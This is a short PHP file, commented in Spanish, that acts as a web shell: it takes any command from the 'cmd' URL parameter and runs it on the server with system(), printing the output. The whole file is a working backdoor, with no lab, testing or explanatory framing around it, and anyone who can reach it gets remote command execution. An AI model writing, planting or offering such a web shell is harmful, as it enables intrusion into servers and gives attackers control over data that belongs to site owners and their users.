<?php
    // Esto ejecuta comandos del sistema operativo y los muestra en pantalla
    if(isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
